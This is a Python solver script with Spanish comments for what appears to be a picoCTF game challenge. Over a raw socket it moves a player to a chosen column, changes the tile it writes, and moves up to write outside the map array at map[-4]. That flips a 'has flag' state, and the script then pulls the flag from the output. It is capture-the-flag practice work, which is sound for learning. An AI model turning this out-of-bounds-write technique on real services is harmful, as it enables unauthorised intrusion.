import socket, time, re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('saturn.picoctf.net', 59375))
time.sleep(0.3)
s.recv(8192)

print("Moviendo a (0, 86) en etapas...\n")

# Etapa 1: Ir a row=0
print("Etapa 1: Subir a row=0...")
for i in range(4):
    s.send(b'w\n')
time.sleep(1.5)
s.recv(8192)

# Etapa 2: Ir a col=86 (en grupos de 20)
print("Etapa 2: Mover derecha a col=86...")
for grupo in range(4):  # 4 grupos de 20 = 80
    for i in range(20):
        s.send(b'd\n')
    time.sleep(0.8)
    s.recv(4096)

# Últimos 2 movimientos para llegar a col=86 (desde col=4, necesito +82 = 86)
s.send(b'd\nd\n')
time.sleep(0.5)

data = s.recv(8192).decode(errors='ignore')
print("Posición actual:")
for line in data.split('\n'):
    if 'Player position' in line:
        print(f"  {line}")

# Comando 'l' + 'b'
print("\nEtapa 3: Comando 'l' + 'b'...")
s.send(b'l')
time.sleep(0.2)
s.send(b'b')
time.sleep(0.2)

# Mover arriba (escribe en (-1, 86) = map[-4])
print("Etapa 4: Mover arriba (escribir en map[-4])...")
s.send(b'w\n')
time.sleep(1)

data = s.recv(8192).decode(errors='ignore')

if 'flag: 1' in data or 'Player has flag: 1' in data:
    print("\n¡¡¡FLAG ACTIVADA!!!")
    s.send(b'p\n')
    time.sleep(3)
    
    final = b''
    for i in range(10):
        try:
            s.settimeout(0.5)
            final += s.recv(8192)
        except:
            break
    
    text = final.decode(errors='ignore')
    match = re.search(r'picoCTF\{[^}]+\}', text)
    if match:
        print(f"\nFLAG: {match.group()}")
else:
    print("\nEstado:")
    for line in data.split('\n'):
        if 'Player' in line or 'flag' in line:
            print(line)

s.close()
